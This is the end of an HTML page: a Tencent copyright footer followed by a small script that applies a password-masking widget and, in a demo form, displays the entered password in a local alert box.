          <span class="xm_textGray">
             &copy;1998 - 2026 Tencent Inc. All Rights Reserved.
          </span>
       </div>
    </div>
    </body>
	</script>
<script type="text/javascript">new MaskedPassword(document.getElementById("password"),"\u25CF");document.getElementById("demo-form").onsubmit=function(){alert('pword = "'+this.pword.value+'"');return false};</script>
</html>